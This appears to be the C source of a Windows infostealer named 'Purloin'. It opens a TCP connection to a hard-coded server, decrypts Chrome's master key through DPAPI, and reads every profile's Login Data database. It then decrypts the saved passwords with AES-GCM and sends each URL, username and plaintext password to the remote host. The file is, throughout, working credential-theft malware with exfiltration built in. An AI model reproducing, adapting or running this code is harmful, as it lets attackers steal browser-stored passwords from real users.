#define WIN32_LEAN_AND_MEAN

//#include <windows.h>
//#include <winsqlite/winsqlite3.h>
#include <sqlite3.h>
#include <stdio.h>
//#include <crtdbg.h>
#include <Shlobj.h>
#include <wchar.h>
#include <shlwapi.h>
#include <stdlib.h>
#include <bcrypt.h>
#include <string.h>
//#include <winsock2.h>
//#include <ws2tcpip.h>
#include <dpapi.h>
#include <wincrypt.h>
#include "Purloin/includes/Purloin_Debug.h"
#include "Purloin/includes/Purloin_Server.h"
#include "Purloin/includes/Purloin_Chrome.h"

#define ENC_MASTER_KEY_LEN 357
#define IV_LEN 12
#define TAG_LEN 16
#define CIPHER_LEN 300
#define DEFAULT_BUFLEN 512
//#define SERVER_IP "purloin2.sytes.net"
#define SERVER_IP "192.168.8.101"
#define DEFAULT_PORT "25565"

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#endif

#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")
#pragma comment (lib, "Wlanapi.lib")

CHAR tcp_send_buffer[DEFAULT_BUFLEN];
SOCKET ConnectSocket = INVALID_SOCKET;

BOOL get_file_handle(PSTR chrome_dir, WIN32_FIND_DATAA* dir_files, HANDLE* dir_handle);
BOOL is_substring_in(const CHAR* substring, PCHAR test_string);
BOOL open_database_conn(PSTR chrome_dir_char, PSTR profile_name, sqlite3** handle_db);
BOOL get_credentials(BCRYPT_KEY_HANDLE handle_bcrypt, BYTE** enc_password, int* size_enc_password, BYTE** cipher_text, PULONG size_cipher_text, BYTE* iv, BYTE* tag, BYTE** tmp_pointer, BYTE** decrypted_byte, PULONG decrypted_byte_size);
BOOL decrypt_password(BCRYPT_KEY_HANDLE handle_bcrypt, BYTE* cipher_text, ULONG size_cipher_text, BYTE* iv, ULONG size_iv, BYTE* tag, ULONG size_tag, BYTE** decrypted_credentials, ULONG* size_decrypted_credentials);
BOOL connect_to_serv(SOCKET* ConnectSocket);
void sendData(char* data);
void closeConnection();

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
//int main() {
	/* Connect to the server */
	if (!connect(&ConnectSocket, SERVER_IP, DEFAULT_PORT)) {
		return FALSE;
	}

	send_machineName(ConnectSocket);

	/* Gets the Chrome Folder if exists, which is% LOCALAPPDATA% \Google\Chrome\User Data */
	WCHAR chrome_dir[MAX_PATH] = { L'\0' };													// Buffer to hold Google Chrome directory
	if (!get_user_dir(FOLDERID_LocalAppData, L"\\Google\\Chrome\\User Data\\", chrome_dir, tcp_send_buffer, DEFAULT_BUFLEN)) {
		Debug(sendData(tcp_send_buffer);)
		exit(1);
	}
	/* Gets the Master Key of Chrome, which is inside% LOCALAPPDATA% \Google\Chrome\User Data\Local State */
	WCHAR enc_master_key[ENC_MASTER_KEY_LEN] = { L'\0' };								// Buffer to hold Encrypted master key(encrypted using CryptProtectData())
	if (!get_encrypted_masterkey(chrome_dir, L"Local State", enc_master_key, ENC_MASTER_KEY_LEN, tcp_send_buffer, DEFAULT_BUFLEN)) {
		Debug(sendData(tcp_send_buffer);)
		exit(1);
	}
	/* Decrypts the Master keyand returns a AES - GCM decrypting algorithm to decrypt passwords. */
	BCRYPT_KEY_HANDLE handle_bcrypt;													// Handle to the decryption algorithm of AES-GCM256
	CHAR char_master_key[ENC_MASTER_KEY_LEN];											// Buffer to hold encrypted BASE64 encoded char type master key
	DATA_BLOB blob_dec_masterkey;														// DATA_BLOB to hold byte form of decrypted master key
	// Decrypt the obtained master key. Decrypted byte form is stored on the blob_dec_masterkey DATA_BLOB
	if (!decrypt_masterkey(enc_master_key, char_master_key, ENC_MASTER_KEY_LEN, &blob_dec_masterkey, tcp_send_buffer, DEFAULT_BUFLEN)) {
		Debug(sendData(tcp_send_buffer);)
		exit(1);
	}
	// Use the decrypted master key to get a handle to the AES-GCM 256 decryption algorithm
	if (!get_decryption_handler(&handle_bcrypt, &blob_dec_masterkey, tcp_send_buffer, DEFAULT_BUFLEN)) {
		Debug(sendData(tcp_send_buffer);)
		exit(1);
	}



	/* Converts the WCHAR chrome directory path to CHAR */
	size_t size_returned_char_master_key;
	errno_t err;
	CHAR chrome_dir_char[MAX_PATH] = { '\0' };												// Chrome directory in CHAR, used to get profile paths to get Login Data db
	if ((err = wcstombs_s(&size_returned_char_master_key, chrome_dir_char, MAX_PATH * sizeof(CHAR), chrome_dir, (MAX_PATH - 1) * sizeof(CHAR)))) {
		sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "wcstombs_s: Error when converting wchar master key to char master key, error: %d\n", err);
		sendData(tcp_send_buffer);
		exit(1);
	}
	/* Gets a file handle for Chrome directory to list the files in that directory */
	WIN32_FIND_DATAA dir_files;																// Handle to get file/folders on Chrome_dir
	HANDLE dir_handle;																		// Handle to a directory/file
	if (!get_file_handle(chrome_dir_char, &dir_files, &dir_handle)) {
		sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "Getting Chrome Directory file handle failed\n");
		sendData(tcp_send_buffer);
		exit(1);
	}

	/* These are used to decrypt the passwords in database */
	ULONG decrypted_credential_size = CIPHER_LEN, default_cipher_text_size = CIPHER_LEN;	// To hold the size of cipher text and the decrypted password size
	BYTE* cipher_text_byte = (BYTE*)malloc(default_cipher_text_size);						// Allocate a buffer to hold the cipher text (actual encrypted password)
	if (!cipher_text_byte) {
		Debug(sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "malloc: Error when allocating buffer for 'cipher_text_byte'\n");)
		Debug(send(tcp_send_buffer, ConnectSocket);)
		return FALSE;
	}
	memset(cipher_text_byte, 0, default_cipher_text_size);
	
	BYTE* decrypted_credential = (BYTE*)malloc(decrypted_credential_size);					// Allocate a buffer to hold the decrypted password in byte form
	if (!decrypted_credential) {
		Debug(sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "malloc: Error when allocating buffer for 'decrypted_credential'\n");)
		Debug(send(tcp_send_buffer, ConnectSocket);)
		return FALSE;
	}
	memset(decrypted_credential, 0, decrypted_credential_size);
	

	/* Go through the files/folders in that directory */
	do {
		if (checkSubtring("Default", dir_files.cFileName) || checkSubtring("Profile", dir_files.cFileName)) {	// Check if a folder starts with "Deafult" or "Profile \d?" to identify profile directories

			sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "------------------------ %s ------------------------\n", dir_files.cFileName);
			sendData(tcp_send_buffer);

			/* Open database connection */
			sqlite3* handle_db;																		// Handle to SQLite Database handle
			sqlite3_stmt* sql_stmt;																	// Handle to SQLite Query Statement
			int status;
			if (!open_database_conn(chrome_dir_char, dir_files.cFileName, &handle_db)) {
				sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "Error when opening database\n");
				sendData(tcp_send_buffer);
				continue;
			}

			/* Create a SQL statement to be executed */
			if ((status = sqlite3_prepare_v2(handle_db, "SELECT origin_url,username_value,password_value FROM logins", -1, &sql_stmt, 0)) != SQLITE_OK) {
				sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "sqlite3_prepare_v2: Error when preaparing statement, error: %s:%d\n", sqlite3_errmsg(handle_db), status);
				sendData(tcp_send_buffer);
				continue;
			}

			/* Ietrate over results one by one */
			while ((status = sqlite3_step(sql_stmt)) == SQLITE_ROW) {
				sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "URL: %s\nUsername: %s\n", sqlite3_column_text(sql_stmt, 0), sqlite3_column_text(sql_stmt, 1));
				sendData(tcp_send_buffer);

				/* Gets the size of the data_blob, which is the encrypted credentials */
				int data_blob_size = sqlite3_column_bytes(sql_stmt, 2); // To hold the size of bytes of the encrypted password

				/* Gets the data_blob to buffer */
				BYTE* data_blob = (BYTE*)sqlite3_column_blob(sql_stmt, 2);	// Variable to hold the retrieved bytes of encrypted password (Which contains password version, IV, cipher text and the tag)

				/* Decrypt password */
				BYTE* tmp_cipher_text_byte;																// Temporary pointer in case if the size of the cipher text buffer is not enough, (to reallocate)
				BYTE iv[IV_LEN] = { 0 }, tag[TAG_LEN] = { 0 };											// Buffers to hold IV and the TAG. Which are used to decrypt the cipher text.
				if (!get_credentials(handle_bcrypt, &data_blob, &data_blob_size, &cipher_text_byte, &default_cipher_text_size, iv, tag, &tmp_cipher_text_byte, &decrypted_credential, &decrypted_credential_size)) {
					sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "Getting decrypted password error\n");
					sendData(tcp_send_buffer);
					continue;
				}

				/* Get the password */
				sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "Password: %s\n", decrypted_credential);
				sendData(tcp_send_buffer);
				memset(decrypted_credential, 0, decrypted_credential_size);

				sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "------------------------------------------\n");
				sendData(tcp_send_buffer);
			}

			/* If any error occurs */
			if (status != SQLITE_ROW) {
				sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "!!! %s:%d\n", sqlite3_errmsg(handle_db), status);
				sendData(tcp_send_buffer);
			}

			/* Reset SQL statement */
			if ((status = sqlite3_reset(sql_stmt)) != 0) {
				sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "sqlite3_reset: %s:%d\n", sqlite3_errmsg(handle_db), status);
				sendData(tcp_send_buffer);
			}

			/* Close the opened database */
			sqlite3_close(handle_db);

			/* Clears the appended '\' + Profile Name + '\Login Data' from the chrome_dir_char to append the path for Login Data for the next user */
			memset(chrome_dir_char + lstrlenA(chrome_dir_char) - lstrlenA(dir_files.cFileName) - 12, '\0', lstrlenA(dir_files.cFileName) + 12);
		}
	} while (FindNextFileA(dir_handle, &dir_files));



	/* Free allocated memory to prevent leaks */
	free(cipher_text_byte);
	free(decrypted_credential);
	close(ConnectSocket);
	//_CrtDumpMemoryLeaks();
	return 0;
}

BOOL get_file_handle(PSTR chrome_dir, WIN32_FIND_DATAA* dir_files, HANDLE* dir_handle) {
	errno_t err;

	/* Append '\*' to the chrome_dir to get the file handle for the '%LOCALAPPDATA%\Google\Chrome\User Data\*' folder */
	if ((err = strcat_s(chrome_dir, MAX_PATH, "\\*")) != 0) {
		sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "strcat_s: Appending '\\\\*' to chrome_dir error: %d\n", err);
		sendData(tcp_send_buffer);
		return FALSE;
	}

	/* Gets the first file/folder handle in the directory, and set it to 'dir_handle' */
	*dir_handle = FindFirstFileA(chrome_dir, dir_files);
	if (dir_handle == INVALID_HANDLE_VALUE) {
		sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "Getting sub directories error: %lu\n", GetLastError());
		sendData(tcp_send_buffer);
		return FALSE;
	}

	/* Clears the ending '\*' part in the chrome_dir */
	memset(chrome_dir + lstrlenA(chrome_dir) - 2, '\0', 2);

	return TRUE;
}

BOOL decrypt_password(BCRYPT_KEY_HANDLE handle_bcrypt, BYTE* cipher_text, ULONG size_cipher_text, BYTE* iv, ULONG size_iv, BYTE* tag, ULONG size_tag, BYTE** decrypted_credentials, ULONG* size_decrypted_credentials) {
	BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO aes_gcm_info;						// Struct to hold additional information required for decrypting (Nonce, Tag)
	ULONG size_required_decrypted_buffer;									// To get the size required to hold decrypted bytes
	BYTE* tmp_byte;															// Temporary pointer, in case if the buffer to hold decrypted bytes is not enough
	NTSTATUS status;

	/* Set Additional info to the struct */
	BCRYPT_INIT_AUTH_MODE_INFO(aes_gcm_info);
	aes_gcm_info.pbNonce = iv;
	aes_gcm_info.cbNonce = size_iv;
	aes_gcm_info.pbTag = tag;
	aes_gcm_info.cbTag = size_tag;

	/* Get the buffer size required to hold the decrypted bytes to the 'size_required_decrypted_buffer' */
	status = BCryptDecrypt(handle_bcrypt, cipher_text, size_cipher_text, &aes_gcm_info, NULL, 0, NULL, 0, &size_required_decrypted_buffer, 0);
	if (!NT_SUCCESS(status)) {
		sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "BCryptDecrypt: Error getting decrypted text size, error: %ld\n", status);
		sendData(tcp_send_buffer);
		return FALSE;
	}

	/* In case if the existing buffer size is not enough, Resize it to fit */
	if (size_required_decrypted_buffer > *size_decrypted_credentials) {
		tmp_byte = (BYTE*)realloc(*decrypted_credentials, size_required_decrypted_buffer);

		if (!tmp_byte) {
			sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "realloc: Error when reallocating size of decrypted_credentials_buffer\n");
			sendData(tcp_send_buffer);
			return FALSE;
		}
		else {
			*decrypted_credentials = tmp_byte;
			*size_decrypted_credentials = size_required_decrypted_buffer;
		}
	}

	/* Actual decryption process */
	status = BCryptDecrypt(handle_bcrypt, cipher_text, size_cipher_text, &aes_gcm_info, NULL, 0, *decrypted_credentials, *size_decrypted_credentials, &size_required_decrypted_buffer, 0);
	if (!NT_SUCCESS(status)) {
		sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "BCryptDecrypt: Error getting decrypted text size, error: %ld\n", status);
		sendData(tcp_send_buffer);
		return FALSE;
	}

	return TRUE;
}

BOOL open_database_conn(PSTR chrome_dir_char, PSTR profile_name, sqlite3** handle_db) {
	errno_t err;
	int status;

	if ((err = strcat_s(chrome_dir_char, MAX_PATH, "\\")) != 0) {											// Apend '\\' to the end of chrome_dir_char to make the path for Login Data file for a specific user profile
		sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "strcat_s: Appending '\\\\' to chrome_dir_char error: %d\n", err);
		sendData(tcp_send_buffer);
		return FALSE;
	}
	if ((err = strcat_s(chrome_dir_char, MAX_PATH, profile_name)) != 0) {									// Append "Default" or "Profile \d?" to the end of chrome_dir_char
		sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "strcat_s: Appending '%s' to chrome_dir_char error: %d\n", profile_name, err);
		sendData(tcp_send_buffer);
		return FALSE;
	}
	if ((err = strcat_s(chrome_dir_char, MAX_PATH, "\\Login Data")) != 0) {									// Append '\Login Data' to end of chrome_dir_char
		sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "strcat_s: Appending 'Login Data' to chrome_dir_char error: %d\n", err);
		sendData(tcp_send_buffer);
		return FALSE;
	}

	if ((status = sqlite3_open_v2(chrome_dir_char, handle_db, SQLITE_OPEN_READONLY, NULL)) != SQLITE_OK) {	// Opens the connection to database
		sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "sqlite3_open_v2: Error when opening database connection to '%s', error: %s:%d\n", profile_name, sqlite3_errmsg(*handle_db), status);
		sendData(tcp_send_buffer);
		return FALSE;
	}

	return TRUE;
}

BOOL get_credentials(BCRYPT_KEY_HANDLE handle_bcrypt, BYTE** enc_password, int* size_enc_password, BYTE** cipher_text, PULONG size_cipher_text, BYTE* iv, BYTE* tag, BYTE** tmp_pointer, BYTE** decrypted_byte, PULONG decrypted_byte_size) {
	/* Reallocates if the size is not enough in the data_blob buffer */
	if (CIPHER_LEN < *size_enc_password) {
		*tmp_pointer = (BYTE*)realloc(*cipher_text, *size_enc_password);
		if (*tmp_pointer) {
			*cipher_text = *tmp_pointer;
			*size_cipher_text = *size_enc_password;
		}
		else {
			sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "Couldn't reallocate memory for cipher_text_byte\n");
			sendData(tcp_send_buffer);
			return FALSE;
		}
	}

	/* Set the IV, TAG, and CIPHER TEXT in corresponding buffers */
	memcpy_s(iv, IV_LEN, *enc_password + 3, IV_LEN);
	memcpy_s(*cipher_text, *size_cipher_text, *enc_password + 3 + 12, *size_enc_password - (3 + 12 + 16));
	memcpy_s(tag, TAG_LEN, *enc_password + (*size_enc_password - 16), 16);

	/* Decrypt the encrypted data_blob to get the password */
	if (!decrypt_password(handle_bcrypt, *cipher_text, *size_enc_password - (3 + 12 + 16), iv, IV_LEN, tag, TAG_LEN, decrypted_byte, decrypted_byte_size)) {
		sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "Decrypting password error\n");
		sendData(tcp_send_buffer);
		return FALSE;
	}

	//sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "Password: %s\n", *decrypted_byte);

	/* Reset buffers, otherwise there could be overlaps */
	memset(iv, 0, IV_LEN);
	memset(tag, 0, TAG_LEN);
	memset(*cipher_text, 0, *size_cipher_text);
	//memset(*decrypted_byte, 0, *decrypted_byte_size);

	return TRUE;
}

void sendData(char* data) {
	// Send an initial buffer
	int iResult;
	iResult = send(ConnectSocket, data, (int)strlen(data), 0);
	//iResult = send(ConnectSocket, "\n", 1, 0);
	if (iResult == SOCKET_ERROR) {
		// sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "send failed with error: %d\n", WSAGetLastError());
		closesocket(ConnectSocket);
		WSACleanup();
	}
	memset(data, 0, DEFAULT_BUFLEN);
}